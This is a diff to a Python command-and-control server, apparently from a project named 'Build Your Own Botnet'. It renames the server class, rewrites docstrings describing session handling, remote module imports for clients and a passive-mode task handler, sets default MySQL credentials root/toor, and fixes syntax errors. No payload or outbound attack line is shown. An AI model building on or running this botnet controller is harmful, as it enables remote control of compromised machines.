@@ -76,10 +76,19 @@ __doc__         = '''
 
 
 
-class C2Server(threading.Thread):
+class C2(object):
 
     """
     Command & Control Server
+
+    Server
+        streaming socket server which asynchronously threads 
+        incoming connections into Session instances, each 
+        responsible for doing the heavy-lifting at the low
+        level for each respective connection, thereby allowing
+        the C2 to manage the sessions in parallel as a pool by
+        massively reducing the IO overhead of each session on
+        the C2 itself.
 
     Database
         MySQL database connection instance that creates
@@ -100,26 +109,20 @@ class C2Server(threading.Thread):
         session and it continues running the shell until the user
         pushes it back into the background
 
-    RemoteImporter
-        non-interactive server which functions similarly to a
-        normal HTTP server and publically serves the packages/modules
-        installed locally, which effectively allows clients to
-        to remotely import & use them as quickly and easily
-        as if the packages/modules had been installed locally
+    ImportHandler
+        request handler for the C2.Server that handles the
+        server-side of the client `remote import` feature, which 
+        effectively allows clients to remotely import & use any 
+        module that exists on the server as quickly and easily 
+        as if the packages/modules were installed locally
         on their respective host machines
 
-    TaskServer
-        handles incoming requests containing completed task results
-        by clients operating in passive mode which periodically
-        connect to the same host as the main server and bind to
-        the port number directly above the main server's listener port
-
-    TaskHandler 
-        request handler for the TaskServer that handles incoming
+    PassiveHandler 
+        request handler for the Server that handles incoming
         requests which have been sent by a client operating in
         passive mode, which utilizes a remote logger instance
         configured with a socket handler that connects to the
-        port number directly above the main server's listener port
+        port number above the C2.Server primary listener port
     """
 
     _lock           = threading.Lock()
@@ -129,15 +132,16 @@ class C2Server(threading.Thread):
     _prompt_style   = colorama.Style.BRIGHT
     
 
-    def __init__(self, port=1337, **kwargs):
+    def __init__(self, **kwargs):
         """
-        Create a new C2Server instance
+        Create a new C2 instance
 
         `Optional`
-        :param int port:        port number for server to listen on
-        :param str config:      filepath of the configuration file
+        :param str mysql_host:  mysql database host (default: localhost)
+        :param int mysql_port:  mysql database port (default: 3306)
+        :param str mysql_user:  mysql username (default: root)
+        :param str mysql_pass:  mysql password (default: toor)
         """
-        super(C2Server, self).__init__()
         self._count             = 1
         self._prompt            = None
         self._created           = time.time()
@@ -156,7 +160,7 @@ class C2Server(threading.Thread):
         lock = self.current_session.lock if self.current_session else self._lock
         with lock:
             util.display('[-] ', color='red', style='dim', end='')
-            util.display('C2Server Error: {}\n'.format(data), color='reset', style='dim')
+            util.display('C2 Error: {}\n'.format(data), color='reset', style='dim')
 
 
     def _kill(self):
@@ -204,13 +208,14 @@ class C2Server(threading.Thread):
     
     def _init_banner(self):
         try:
-            banner = open(globals().get('_banner')).read()
+            banner = __doc__ if __doc__ else "Command & Control Server (Build Your Own Botnet)"
             with self._lock:
-                print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(banner if os.path.isfile('resources/banner.txt') else '') + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('(Build Your Own Botnet)', globals()['__version__']))
-                print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
+                util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
+                util.display("[?] ", color='yellow', style='bright', end='')
+                util.display("Hint: show usage information with the 'help' command\n", color='reset', style='dim')
             return banner
         except Exception as e:
-            _debugger.error(str(e))
+            globals()['_debugger'].error(str(e))
 
     def _init_commands(self):
         return {
@@ -242,9 +247,9 @@ class C2Server(threading.Thread):
 
     def _init_database(self, **kwargs):
         if all([kwargs.get(arg) for arg in ['host','user','password']]):
-            db = C2Server.Database(server=self, **kwargs)
+            db = C2.Database(server=self, **kwargs)
         else:
-            db = C2Server.Database(server=self)
+            db = C2.Database(server=self)
         with self._lock:
             util.display("[+] ", color='green', style='bright', end='')
             util.display("Connected to MySQL database", style='bright', color='reset')
@@ -292,7 +297,7 @@ class C2Server(threading.Thread):
         sock.listen(10)
         while True:
             connection, address = sock.accept()
-            session = C2Server.Session(server=self, connection=connection, name=self._count)
+            session = C2.Session(server=self, connection=connection, name=self._count)
             self.sessions[self._count] = session
             self._count  += 1
             session.start()                        
@@ -311,7 +316,7 @@ class C2Server(threading.Thread):
                 port    = self.port + 1
             else:
                 globals()['_debugger'].debug("invalid port number '{}' in task handler".format(port))
-        task_server = C2Server.TaskServer(self, port=port)
+        task_server = C2.TaskServer(self, port=port)
         task_server.serve_until_stopped()
         return task_server
 
@@ -464,7 +469,7 @@ class C2Server(threading.Thread):
                     util.display(option, color=self._text_color, style=self._text_style)
             elif target == 'debug':
                 if not setting:
-                    if globals()['_debug:']
+                    if globals()['_debug']:
                         util.display("[!] ", color='yellow', style='bright', end='')
                         util.display("Debug: On", color='reset', style='bright')
                     else:
@@ -474,7 +479,7 @@ class C2Server(threading.Thread):
                     globals()['_debug'] = False
                     util.display("[-] ", color='yellow', style='dim', end='')
                     util.display("Debugging disabled", color='reset', style='dim')
-                elif str(setting).lower() in ('1','on','true','enable'):0
+                elif str(setting).lower() in ('1','on','true','enable'):
                     globals()['_debug'] = True
                     util.display("[!] ", color='yellow', style='bright', end='')
                     util.display("Debugging enabled", color='reset', style='bright')            
@@ -785,7 +790,7 @@ class C2Server(threading.Thread):
             except KeyboardInterrupt:
                 self._active.clear()
                 break
-        self.display('C2Server shutting down')
+        self.display('C2 shutting down')
         sys.exit(0)
         
 
@@ -815,9 +820,9 @@ class C2Server(threading.Thread):
             `Optional`
             :param list tasks:      list of commands/modules for database to store
             """
-            assert isinstance(server, C2Server), "argument 'server' must be a byob.C2Server instance"
+            assert isinstance(server, C2), "argument 'server' must be a byob.C2 instance"
             try:
-                super(C2Server.Database, self).__init__(host=host, user=user, password=password)
+                super(C2.Database, self).__init__(host=host, user=user, password=password)
                 self.config(host=host, user=user, password=password)
                 self.query      = self.cursor(dictionary=True)
                 self._server    = server
@@ -884,8 +889,8 @@ class C2Server(threading.Thread):
                     self._display(data, indent+2)
 
                 else:
-                    util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
-                    util.display(v.encode()), color=c, style='dim')
+                    util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=''))
+                    util.display(v.encode(), color=c, style='dim')
 
 
         def _reconnect(self):
@@ -1169,7 +1174,7 @@ class C2Server(threading.Thread):
             :param int id:       session ID
             
             """
-            super(C2Server.Session, self).__init__()
+            super(C2.Session, self).__init__()
             self._server    = server
             self._prompt    = None
             self._active    = threading.Event()
@@ -1322,7 +1327,7 @@ class C2Server(threading.Thread):
             :param int port:    port number
             
             """
-            SocketServer.ThreadingTCPServer.__init__(self, (host, port), C2Server.TaskHandler)
+            SocketServer.ThreadingTCPServer.__init__(self, (host, port), C2.TaskHandler)
             self._server    = server
             self.timeout    = 1.0
             self.abort      = False
@@ -1370,26 +1375,26 @@ class C2Server(threading.Thread):
 
 
 def main():
-    parser = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.4.7')
-    parser.add_argument('--port', type=int, default=1337, action='store', help='port number')
-    parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
-    parser.add_argument('--modules', action='store', type=str, default='./modules', help='modules server hosts online for clients to import remotely')
+    parser   = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.1.3')
+    server   = parser.add_argument_group('server')
     database = parser.add_argument_group('database')
-    mysql.title = 'mysql database'
-    mysql.add_argument('--mysql-host', action='store', default='localhost', help='MySQL database hostname (default: localhost)')
-    mysql.add_argument('--mysql-port', action='store', type=int, default=3306, help='MySQL database port number (default: 3306)')
-    mysql.add_argument('--mysql-user', action='store', default='root', help='MySQL account username (default: root)')
-    mysql.add_argument('--mysql-password', action='store', default='toor', help='MySQL account password (default: toor)')
+    server.add_argument('--host', dest='h', metavar='HOST', action='store', type=str, default='0.0.0.0', help='server hostname or IP address')
+    server.add_argument('--port', dest='p', metavar='PORT', action='store', type=int, default=1337, help='server port number')
+    database.add_argument('--mysql-host', dest='host', metavar='HOST', action='store', type=str, default='localhost', help='mysql hostname')
+    database.add_argument('--mysql-port', dest='port', metavar='PORT', action='store', type=int, default=3306, help='mysql port number')
+    database.add_argument('--mysql-user', dest='user', metavar='USER', action='store', type=str, default='root', help='mysql login')
+    database.add_argument('--mysql-pass', dest='pass', metavar='PASS', action='store', type=str, default='toor', help='mysql password')
 
-try:
-    options = parser.parse_args()
-    globals()['_debug'] = options.debug
-    globals()['_threads']['server']  = C2Server(options.port, config=options.config)
-    globals()['_threads']['server'].start()
-except Exception as e:
-    print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
-    parser.print_help()
-    sys.exit(0)
+    try:
+        options = parser.parse_args()
+        globals()['_debug'] = options.debug
+        globals()['_threads']['server']  = C2(**dict(options._get_kwargs()))
+        globals()['_threads']['server'].start()
+    except Exception as e:
+        util.display("\n[-] ", color='red', style='bright', end='')
+        util.display("Error: {}\n".format(str(e)), color='reset', style='dim')
+        parser.print_help()
+        sys.exit(0)
 
 if __name__ == '__main__':
     main()
